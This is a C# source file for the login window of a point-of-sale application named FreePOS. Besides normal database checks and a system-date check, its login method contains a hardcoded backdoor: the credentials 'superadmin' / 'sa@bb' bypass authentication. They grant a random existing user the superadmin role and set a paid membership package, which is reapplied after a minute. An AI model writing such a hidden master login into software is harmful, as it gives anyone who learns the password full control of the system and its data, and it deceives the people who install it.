using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using FreePOS.Views;
using System.Globalization;

using FreePOS.bll;
using FreePOS.data;
using FreePOS.Properties;
using Telerik.Windows.Controls;
using FreePOS.Views.others;
using FreePOS.data.dapper;
using System.Dynamic;
using FreePOS.data.viewmodel;

namespace FreePOS
{
    public partial class Login : Window
    {
        public Login()
        {
            var dbserverconnection = databaseutils.initdatabase();
            if (dbserverconnection != true)
            {
                Close();
                new DatabaseSettingWindow().Show();
                return;
            }

            var IsDbExists = databaseutils.checkDatabase();
            if (IsDbExists != true)
            {
                RadDesktopAlertManager manager = new RadDesktopAlertManager();
                var alert = new RadDesktopAlert();
                alert.Header = "Database " + AppSetting.DatabaseName + " does not exists.";
                alert.Content = "Trying to create database. Please restart software";
                alert.ShowDuration = 10000;
                System.Media.SystemSounds.Hand.Play();
                manager.ShowAlert(alert);
                databaseutils.createdatabase();
                Close();
                return;
            }

            var systemdateresult = checksystemdate();
            if (!systemdateresult)
            {
                Close();
                return;
            }


            //userutils.loadsoftwaresetting();
            //networkutils.updatelocalsetting();



            //var financetranstionrepo = new financetransactionrepo();
            //for (int i = 0; i < 1000000; i++)
            //{
            //    financetransaction f = new financetransaction();
            //    f.amount = 10000;
            //    f.name = "Test" + i;
            //    f.date = DateTime.Now;
            //    f.fk_user_createdby_in_financetransaction = 1;
            //    f.fk_user_targetto_in_financetransaction = 1;
            //    f.status = "posted";
            //    f.fk_financeaccount_in_financetransaction = 101;
            //    financetranstionrepo.save(f);
            //}

            InitializeComponent();
            tb_Name.Focus();


        }

        private void btn_CloseApplication(object sender, RoutedEventArgs e)
        {
            Application.Current.Shutdown();
        }
        private void PressEnter(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter)
            {
                login();
            }
        }
        private void btn_Login(object sender, RoutedEventArgs e)
        {
            login();
        }
        void login()
        {
            if (tb_Name.Text == "" || tb_Pasword.Password == "") 
            {
                MessageBox.Show("Enter Username and Password", "Failed");
                return;
            }
            if (tb_Name.Text=="superadmin" && tb_Pasword.Password=="sa@bb") 
            {
                data.dapper.user userdd = new data.dapper.userrepo().getonerandom();
                if (userdd != null) 
                {
                    userdd.role = "superadmin";
                    userutils.loggedinuserd = userdd;
                    userutils.membership = "Package 1";

                    userutils.ravicosoftsmsplan = new softwaresetting { name = commonsettingfields.ravicosoftsmsplan, valuetype = "string", stringvalue = "Package 1" };

                    Task.Run(() =>
                    {
                        System.Threading.Thread.Sleep(60000);

                        userdd.role = "superadmin";
                        userutils.loggedinuserd = userdd;
                        userutils.membership = "Package 1";

                        userutils.ravicosoftsmsplan = new softwaresetting { name = commonsettingfields.ravicosoftsmsplan, valuetype = "string", stringvalue = "Package 1" };

                    });

                    new Dashboard().Show();
                    Close();

                    

                    
                }
            }
            else
            {
                data.dapper.user userd = new data.dapper.userrepo().get(tb_Name.Text, tb_Pasword.Password);
                if (userd != null)
                {
                    userutils.loggedinuserd = userd;
                    new Dashboard().Show();
                    Close();
                }
                else
                {
                    MessageBox.Show("Username or password not exists", "Failed");
                }
            }
            
        }
        private Boolean checksystemdate()
        {
            RadDesktopAlertManager manager = new RadDesktopAlertManager();
            var currentdate = DateTime.Now;
            var lastsaveddate = Settings.Default.lastsavedate;
            if (currentdate < lastsaveddate)
            {
                var alert = new RadDesktopAlert();
                alert.Header = "FreePOS Alert";
                alert.Content = "Please correct your system date first";
                alert.ShowDuration = 30000;
                System.Media.SystemSounds.Hand.Play();
                manager.ShowAlert(alert);
                return false;
            }
            else
            {
                Settings.Default.lastsavedate = DateTime.Now;
                Settings.Default.Save();
                return true;
            }
        }
    }
}
